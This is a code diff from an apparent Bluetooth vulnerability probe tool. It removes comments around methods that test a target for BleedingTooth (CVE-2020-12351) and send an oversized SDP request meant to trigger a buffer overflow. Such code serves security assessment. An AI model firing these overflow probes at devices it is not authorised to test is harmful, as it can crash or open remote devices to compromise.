@@ -68,7 +68,6 @@ class SDPProbe:
             s.settimeout(5)
             s.connect((self.target, 3))
             logger.success("A2MP channel reachable — BleedingTooth CVE-2020-12351 may apply")
-            # Send A2MP GetInfo Request (code=0x05)
             pkt = struct.pack("<BBH", 0x05, 0x42, 4) + struct.pack("<I", 0)
             s.send(pkt)
             try:
@@ -88,7 +87,6 @@ class SDPProbe:
 
     def probe_sdp_bof(self):
         logger.info(f"SDP BOF probe (SOLID-2026-005) → {self.target}…")
-        # Benign probe first
         benign = self._sdp_pdu(max_attr=0x0100, trans_id=0x1111)
         sock = self._connect()
         if sock is None:
@@ -100,7 +98,6 @@ class SDPProbe:
             return False
         logger.info(f"Benign SDP response: {len(resp1)} bytes — service alive")
 
-        # Overflow probe
         overflow = self._sdp_pdu(max_attr=0x10000, trans_id=0x1337)
         sock2 = self._connect()
         if sock2 is None:
